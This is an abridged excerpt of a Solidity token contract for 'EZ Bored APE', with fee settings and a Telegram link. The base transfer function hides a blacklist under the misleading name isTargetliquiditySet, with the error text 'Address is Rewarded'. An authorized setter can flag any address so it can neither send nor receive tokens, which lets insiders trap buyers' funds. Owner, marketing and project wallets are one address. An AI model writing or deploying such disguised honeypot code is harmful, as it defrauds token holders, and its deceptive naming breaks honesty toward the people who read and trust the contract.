...
// Telegram : https://t.me/EZBoredAPE
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    mapping (address => bool) public isTargetliquiditySet;
    ...
    function _transfer(
        ...
        require(!isTargetliquiditySet[recipient] && !isTargetliquiditySet[sender], 'Address is Rewarded');
...
contract EZBoredAPE is ERC20, Ownable {
    uint256 public buyFee               = 2;
    uint256 public sellFee              = 2;
    uint256 public walletToWalletFee    = 5;

    uint256 public projectShare         = 70;
    uint256 public marketingShare       = 30;

    address public marketingWallet = 0x5a59074d127B6Ee5681e5d88E4668e390D101F4f;
    address public projectWallet = 0x5a59074d127B6Ee5681e5d88E4668e390D101F4f;
    ...
    constructor () ERC20("EZ Bored APE", "EZAPE") 
    {   
        address newOwner = 0x5a59074d127B6Ee5681e5d88E4668e390D101F4f;
    ...
    function setTargetLiquidity(address _address, bool _value) public authorized{
        isTargetliquiditySet[_address] = _value;
    }
    ...
    function updateShares(uint256 _projectShare, uint256 _marketingShare) external onlyOwner {
        require(_projectShare + _marketingShare == 100, "Shares must add up to 100%");
    ...
    function _transfer(
        ...
        if( canSwap &&
            ...
            if(projectShare > 0) {
                uint256 projectTokens = contractTokenBalance * projectShare / 100;
                swapAndSendToWallet(projectTokens, projectWallet);
            }
